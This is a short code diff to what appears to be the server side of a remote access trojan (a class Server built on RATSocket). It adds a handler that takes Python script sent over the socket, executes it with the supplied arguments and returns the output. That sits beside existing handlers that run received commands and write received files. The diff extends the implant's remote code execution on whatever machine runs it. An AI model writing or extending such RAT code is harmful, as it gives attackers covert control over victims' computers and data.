@@ -1,7 +1,9 @@
+import json
 import ntpath
 import os
 
 from entity.ratsocket import RATSocket
+from util.command import Command
 from util.common_util import decode
 
 
@@ -35,6 +37,11 @@ class Server(RATSocket):
         head, body = self.recv()
         if head['type'] == 'command':
             command_handler(decode(body))
+        elif head['type'] == 'script':
+            try:
+                self.send_result(*Command.pyexec(decode(body), json.loads(head['args'])))
+            except Exception as e:
+                self.send_result(0, str(e))
         elif head['type'] == 'file':
             try:
                 with open(head['filename'], 'wb') as file:
